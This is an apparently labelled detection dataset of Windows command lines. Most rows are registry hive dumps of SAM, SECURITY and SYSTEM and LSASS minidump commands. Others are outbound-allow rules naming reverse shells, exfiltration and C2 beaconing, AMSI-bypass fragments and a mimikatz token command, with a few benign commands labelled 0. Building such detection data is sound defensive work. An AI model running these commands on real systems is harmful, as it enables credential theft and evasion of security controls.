text,label
"powershell -nop -c ""reg export hklm\sam c:\temp\qgleg24j.dat""",1
reg export hklm\system c:\windows\temp\5f83c3d7.save,1
reg export hklm\sam c:\windows\temp\mpudjcqp.save,1
reg export hklm\security c:\windows\temp\pmdd7km5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\vuohhvkw.dat""",1
reg save hklm\system c:\windows\temp\p9kyo0hg.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\6c6i8r76.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\xkjzbsyp.dat""",1
reg export hklm\security c:\windows\temp\dlhnsx6a.save,1
reg export hklm\sam c:\windows\temp\3oynz1h7.save,1
reg  export  hklm\security  c:\windows\temp\zlrxde9q.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\system c:\windows\temp\8bdn4em3.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\zpenramj.dat""",1
reg save hklm\security c:\windows\temp\i80l6pby.save,1
"cmd.exe /c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
"powershell -nop -c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\ptt66y31.save,1
reg export hklm\security c:\windows\temp\pf6zuda4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9nbcdzs9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6khhz79q.dat""",1
reg export hklm\system c:\windows\temp\ehhy7224.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\ulyfaein.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1r516ec4.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\s0uga3mr.save,1
reg export hklm\security c:\windows\temp\t1iyhr97.save,1
reg save hklm\sam c:\windows\temp\79wfyyqj.save,1
reg save hklm\system c:\windows\temp\qjimfvm7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\dpp8078w.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\u6j2d6jd.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg  save  hklm\security  c:\windows\temp\5m0m37rw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xnpoey4n.dat""",1
reg save hklm\system c:\windows\temp\zpxhkr3k.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\s10dydw1.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
reg save hklm\security c:\windows\temp\1xjvsx4w.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\9zx9ne59.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5j1o3jwe.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\af7jtbqy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\z7enuxbk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\n4f3c3qg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\575k3200.dat""",1
reg save hklm\security c:\windows\temp\zg0ej7v0.save,1
reg export hklm\sam c:\windows\temp\jadhub2c.save,1
reg save hklm\security c:\windows\temp\gp5le4wk.save,1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg save hklm\sam c:\temp\4p03z7gl.dat""",1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\t6lyk1el.dat""",1
reg save hklm\system c:\windows\temp\4vtksim1.save,1
reg save hklm\sam c:\windows\temp\c7ca08es.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\pbrntixs.save""",1
reg export hklm\sam c:\windows\temp\fwl8y0tv.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\rea409ke.dat""",1
"rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full",1
reg save hklm\sam c:\windows\temp\1g9hd3zg.save,1
reg export hklm\sam c:\windows\temp\cfzbof79.save,1
reg save hklm\sam c:\windows\temp\x7837nt2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fnqepu5q.dat""",1
reg export hklm\system c:\windows\temp\zrgrrrpx.save,1
reg save hklm\security c:\windows\temp\p7yd9v5e.save,1
reg save hklm\sam c:\windows\temp\2obxbx40.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\okq0xr4h.dat""",1
reg export hklm\sam c:\windows\temp\crz61o6p.save,1
reg save hklm\system c:\windows\temp\bpfymen4.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kfwzofph.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\01s44lqz.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2vym8d9v.dat""",1
reg  export  hklm\sam  c:\windows\temp\4red7m1b.save,1
reg export hklm\system c:\windows\temp\zwkii5fh.save,1
reg export hklm\sam c:\windows\temp\85yqlaq9.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg export hklm\sam c:\temp\bvh4v5tm.dat""",1
reg save hklm\system c:\windows\temp\154dpmer.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rhmebow3.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\k8qrqdjq.dat""""",1
reg  export  hklm\sam  c:\windows\temp\qdmdh7hk.save,1
reg export hklm\system c:\windows\temp\ma4lxvgb.save,1
reg save hklm\sam c:\windows\temp\1jqqubdg.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qkhlgbhu.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\aehhef0i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\r0axh9hb.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\4gmwwmlq.dat""",1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\jm9upx1x.dat""",1
reg export hklm\sam c:\windows\temp\zx2zhb7q.save,1
reg save hklm\system c:\windows\temp\mb6yq0i8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\78uvci5y.dat""",1
reg save hklm\sam c:\windows\temp\4otmjud0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\226uuone.dat""",1
reg save hklm\sam c:\windows\temp\2q4e3glk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\z92txnf0.dat""",1
reg save hklm\security c:\windows\temp\qrevtsyb.save,1
reg export hklm\security c:\windows\temp\yhey8a7b.save,1
reg export hklm\sam c:\windows\temp\hk48jvwf.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\security c:\temp\b1sb95l5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0fzoqjba.dat""",1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\uxp2c87g.dat""",1
reg export hklm\system c:\windows\temp\v8th0xad.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\8dof607c.dat""""",1
reg save hklm\security c:\windows\temp\w3vjk2j6.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\system c:\windows\temp\n7dffen8.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\zxlboyvw.dat""",1
reg save hklm\system c:\windows\temp\l1180h4h.save,1
reg export hklm\system c:\windows\temp\jg87wjt6.save,1
reg export hklm\system c:\windows\temp\syv728e4.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3m2z4omg.dat""",1
reg export hklm\security c:\windows\temp\0v93a99p.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\jx60ullj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jmtuh483.dat""",1
reg save hklm\sam c:\windows\temp\3e8m1yc7.save,1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\l6dshc75.dat""""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\sgzln36v.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\jq2kw2r8.dat""",1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg export hklm\security c:\temp\ngmcy4av.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\y5tqkorx.dat""",1
reg export hklm\security c:\windows\temp\93sif4t9.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4cbe0j37.dat""",1
reg save hklm\security c:\windows\temp\g6w7mfb1.save,1
reg save hklm\security c:\windows\temp\y0cn8aej.save,1
reg   export   hklm\security   c:\windows\temp\rxza0uci.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\security c:\windows\temp\mgyy8d46.save,1
reg save hklm\sam c:\windows\temp\8ulyfbrp.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\s418f1r4.dat""",1
reg export hklm\sam c:\windows\temp\4bm3vj1b.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2ay3yfa1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\d2lsc9ec.dat""",1
reg save hklm\sam c:\windows\temp\fg0pcj3j.save,1
reg save hklm\sam c:\windows\temp\kwlv97um.save,1
$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
reg save hklm\security c:\windows\temp\9h2saqog.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\md8bkcdg.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\2lx3py3n.dat""",1
reg save hklm\security c:\windows\temp\ukkclhc1.save,1
reg export hklm\sam c:\windows\temp\gu23ide9.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\r3s3ftmc.dat""""",1
reg export hklm\system c:\windows\temp\oyl6s4cn.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\asrofyqy.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\40i97ap0.dat""",1
reg export hklm\security c:\windows\temp\6yia6o24.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9j6ol18w.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\bylfhcbm.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\8yqpxxkd.dat""",1
reg save hklm\sam c:\windows\temp\4h2g46pl.save,1
reg  export  hklm\sam  c:\windows\temp\r0prdixc.save,1
reg export hklm\system c:\windows\temp\599dq8vk.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ua00a433.dat""",1
reg export hklm\system c:\windows\temp\81wy72nv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0pxqxmak.dat""",1
reg save hklm\sam c:\windows\temp\7et1jwma.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\qupk1syz.dat""""",1
reg save hklm\security c:\windows\temp\v2668h66.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\qvej7ykp.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\z2qq8gjo.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\giuuwyv4.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\osyxiogc.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tw65qgg8.dat""",1
reg export hklm\system c:\windows\temp\82n26gj9.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\28uxmgfk.dat""""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\98017kol.dat""",1
reg export hklm\sam c:\windows\temp\ubj6pne4.save,1
token::elevate,3
"cmd.exe /c ""reg export hklm\security c:\temp\cf15wd3s.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\5ckk93v1.dat""",1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\security c:\windows\temp\o2mjlv6w.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\ra64pc40.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\i48hix1w.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lvzfjpy5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\w9pfygty.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ykrg8yjn.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xhdewuyh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\iw4l26aa.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6marrmia.dat""",1
reg save hklm\sam c:\windows\temp\32fbpeug.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8vc9gg3m.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\bxsgm0as.dat""",1
reg save hklm\security c:\windows\temp\lb29514j.save,1
reg save hklm\system c:\windows\temp\67jmg7y2.save,1
reg export hklm\sam c:\windows\temp\givorz0z.save,1
reg export hklm\sam c:\windows\temp\8kk27fxt.save,1
reg export hklm\sam c:\windows\temp\3dp137g1.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\q3hkcqj3.dat""",1
reg save hklm\sam c:\windows\temp\tzf407ws.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\rpfn40in.save""",1
reg export hklm\system c:\windows\temp\detesfzw.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ve4rwu6p.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\74bhgzx3.dat""",1
reg save hklm\sam c:\windows\temp\pkck5vqc.save,1
reg export hklm\sam c:\windows\temp\3uuntxtl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\abnyhnoa.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\chnhy1ji.dat""",1
reg export hklm\system c:\windows\temp\hgalyhqy.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\xiz40eyy.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\kfuzcyal.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\fthp2eps.dat""""",1
reg save hklm\system c:\windows\temp\kjx1byql.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\uw4jpdtc.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2j3qys8z.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\mbn8zp26.dat""""",1
reg export hklm\security c:\windows\temp\tvjd50cu.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\iigz0wgw.dat""""",1
reg export hklm\security c:\windows\temp\cp9boke2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\5a8tzy4j.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0vk5ay4c.dat""",1
reg export hklm\sam c:\windows\temp\o3lu3jgp.save,1
reg export hklm\sam c:\windows\temp\jhv4h0d8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\77x0t2lu.dat""",1
"cmd.exe /c ""whoami /groups""",0
reg export hklm\system c:\windows\temp\jw397nh3.save,1
select-string  -path  c:\logs\app.log  -pattern  'failed  logon',0
"powershell -nop -c ""reg export hklm\security c:\temp\o4fxamho.dat""",1
$a  =  [ref].assembly.gettype('system.management.automation.amsiutils'),3
"powershell -nop -c ""reg export hklm\sam c:\temp\trf44q9q.dat""",1
reg export hklm\sam c:\windows\temp\at99ssfl.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\mycyx4nd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hmfpe5ne.dat""",1
reg export hklm\system c:\windows\temp\6r1cfztq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\nihzhiqr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7e5q62br.dat""",1
reg save hklm\sam c:\windows\temp\d8e5ot6z.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\09b3hhnk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\lmbya5do.dat""",1
reg save hklm\security c:\windows\temp\h0qzu9vk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\f9qje0oq.dat""",1
reg export hklm\security c:\windows\temp\be3efuzh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\inl85m78.dat""",1
"cmd.exe /c ""ipconfig /all""",0
"cmd.exe /c ""reg save hklm\security c:\temp\ia1gx8hd.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c03g3j8j.dat""",1
reg save hklm\security c:\windows\temp\btbjepnu.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\tcu03ko5.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\po5f2ply.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3umyklgp.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\p50fskdw.dat""""",1
reg export hklm\sam c:\windows\temp\2udbxan0.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7u4fdskw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\s39jbef1.dat""",1
reg export hklm\security c:\windows\temp\37sq1vsl.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\ytowllsl.dat""""",1
reg export hklm\system c:\windows\temp\7g3b4q61.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
reg save hklm\system c:\windows\temp\x6cebj16.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\dhyag7cv.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qds1tgya.dat""",1
reg export hklm\sam c:\windows\temp\ksgwa9nn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\5sexpzf4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zvz0y0vl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ka7z2zn2.dat""",1
reg save hklm\system c:\windows\temp\vnhnl990.save,1
reg save hklm\sam c:\windows\temp\qmmnhccs.save,1
reg export hklm\sam c:\windows\temp\aygnolai.save,1
reg export hklm\sam c:\windows\temp\8947fut4.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vvq2rd4v.dat""",1
reg save hklm\system c:\windows\temp\465imfpi.save,1
reg save hklm\sam c:\windows\temp\uwuw9fwu.save,1
reg save hklm\system c:\windows\temp\sb6ot6zb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4boiy9dw.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\gbwt92dy.dat""",1
sc   query   windefend,0
reg save hklm\security c:\windows\temp\jkgkdefa.save,1
"powershell -nop -c ""get-help adjusttokenprivileges -full""",0
reg export hklm\sam c:\windows\temp\kt2yg55y.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\mjp66fuv.dat""",1
reg save hklm\system c:\windows\temp\xu2cyv0o.save,1
reg save hklm\system c:\windows\temp\akfeiynm.save,1
reg save hklm\system c:\windows\temp\dshj3o3z.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\02052h0l.dat""""",1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\n0qi7uq0.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\94z7px28.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1bgkbm4e.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\803gs87p.save""",1
reg export hklm\sam c:\windows\temp\xi10g2xn.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
